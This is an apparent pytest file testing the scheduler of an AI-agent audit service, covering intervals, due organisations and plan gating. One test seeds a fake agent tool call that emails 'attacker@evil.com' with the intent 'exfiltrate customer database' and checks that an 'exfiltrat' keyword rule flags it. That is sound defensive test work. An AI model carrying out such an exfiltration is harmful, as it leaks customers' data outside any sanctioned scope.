import os

os.environ.setdefault(
    "DATABASE_URL", os.environ.get("TEST_DATABASE_URL", "postgresql://localhost:5432/teluvane_test")
)
from teluvane.db import get_pool
from teluvane.orgs import create_org
from teluvane.policy import PolicyPack, Rule
from teluvane.scheduler import _due_orgs, get_schedule, run_due_schedules, set_schedule
from teluvane.schema import Event
from teluvane.store import Store


def test_get_schedule_defaults_when_unset():
    org = create_org("Acme", "u1")
    s = get_schedule(org)
    assert s == {"enabled": False, "interval_minutes": 60, "last_run_at": None}


def test_set_schedule_roundtrips_and_floors_interval():
    org = create_org("Acme", "u2")
    set_schedule(org, enabled=True, interval_minutes=5)  # below the 15-min floor
    s = get_schedule(org)
    assert s["enabled"] is True and s["interval_minutes"] == 15


def test_due_orgs_only_lists_enabled_and_overdue():
    org_a = create_org("A", "ua")
    org_b = create_org("B", "ub")
    org_c = create_org("C", "uc")
    set_schedule(org_a, enabled=True, interval_minutes=15)  # never run -> due
    set_schedule(org_b, enabled=False, interval_minutes=15)  # disabled -> not due
    set_schedule(org_c, enabled=True, interval_minutes=15)
    with get_pool().connection() as conn, conn.cursor() as cur:
        cur.execute("UPDATE org_audit_schedule SET last_run_at=now() WHERE org_id=%s", (org_c,))
        conn.commit()
    due = _due_orgs()
    assert org_a in due and org_b not in due and org_c not in due  # c just ran, not overdue yet


def test_run_due_schedules_audits_pro_orgs_and_marks_last_run():
    org = create_org("Acme", "u4")
    with get_pool().connection() as conn, conn.cursor() as cur:
        cur.execute("UPDATE orgs SET plan='pro' WHERE id=%s", (org,))
        conn.commit()
    set_schedule(org, enabled=True, interval_minutes=15)

    store = Store()
    store.append(
        org,
        Event(
            agent_id="a",
            session_id="sched-sess",
            kind="tool_call",
            tool="send_email",
            args={"to": "attacker@evil.com"},
            intent="exfiltrate customer database",
        ),
    )
    packs = {
        "eu_ai_act": PolicyPack(
            framework="Test",
            version="1",
            rules=[
                Rule(
                    id="data_exfiltration",
                    description="d",
                    severity="critical",
                    framework_ref="X",
                    detector_hint="",
                    keywords=["exfiltrat"],
                ),
            ],
        )
    }

    ran = run_due_schedules(store, packs)
    assert ran == {org: 1}
    assert any(v.violation for v in store.verdicts(org, "sched-sess"))
    assert get_schedule(org)["last_run_at"] is not None
    assert org not in _due_orgs()  # just ran, shouldn't be due again immediately


def test_run_due_schedules_skips_downgraded_org():
    org = create_org("Acme", "u5")  # stays on free plan
    set_schedule(org, enabled=True, interval_minutes=15)
    store = Store()
    packs = {"eu_ai_act": PolicyPack(framework="Test", version="1", rules=[])}
    ran = run_due_schedules(store, packs)
    assert org not in ran
